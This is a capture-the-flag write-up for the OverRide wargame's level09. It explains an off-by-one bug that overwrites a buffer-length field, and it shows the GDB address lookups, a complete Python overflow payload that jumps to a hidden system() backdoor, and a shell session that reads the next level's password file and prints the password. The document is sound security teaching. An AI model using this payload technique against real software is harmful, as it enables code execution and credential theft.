# Level09

## Analysis

First of all, we can see there is an uncalled function `secret_backdoor()`, which uses `fgets(s)` and `system(s)`.

`main()` call `handle_msg()`, inside of the latter, there is what we can assume to be a structure containing a buffer of 140 characters, and an unsigned int right after, set to 140 (which we can also assume to be the size of the buffer).

`set_username()` writes one byte after the end of the second buffer, (`i <= 40` and not `i < 40`), hence allowing us to overwrite the unsigned int right after (the size of the buffer). We can then set it to 255 (`0xff`) instead of the given 140.

After that, `set_msg()` is called and copies our input into the struct buffer, however `strncpy()` using the size of the buffer specified in the unsigned int of the struct, which we've previously overwritten. Which allows us to override `%eip` and set it to whatever the address of `secret_backdoor()` is.

## Exploit

First, we will get the address of `secret_backdoor()` using GDB, since PIE is enabled we cannot use the one we get from `objdump -t` as we will see right now:

```bash
(gdb) p secret_backdoor 
$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>
(gdb) quit
level09@OverRide:~$ objdump -t level09 | grep secret
000000000000088c g     F .text	0000000000000034              secret_backdoor
level09@OverRide:~$
```

As you can see both of them are almost filled with zeroes and aren't the address we want, to get it, you must run the program first inside of GDB:

```bash
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
(gdb) 
```

<details>
  <summary>Spoiler</summary>

For our payload, we will first write over the first 40 bytes of our buffer, then we will specify the new size of the buffer stored inside the struct:

`python -c "print '\x90' * 40 + '\xff\n'`

Right after, we will fill the first 200 bytes with garbage, and then the address of `secret_backdoor()`. Then `system()` is called and we can give it our arguments:

`(python -c "print '\x90' * 40 + '\xff\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh'"; cat) | ./level09 `

```bash
level09@OverRide:~$ (python -c "print '\x90' * 40 + '\xff\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh'"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

</details>
